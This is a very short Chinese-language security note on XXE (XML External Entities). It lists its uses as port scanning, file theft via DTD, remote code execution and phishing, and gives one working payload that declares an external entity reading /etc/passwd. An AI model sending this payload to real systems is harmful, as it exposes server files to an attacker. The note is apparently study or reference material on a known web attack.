# XXE

## 简介

XXE，XML External Entities。

## 利用

端口扫描，通过DTD盗取文件，RCE，钓鱼。

```js
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```



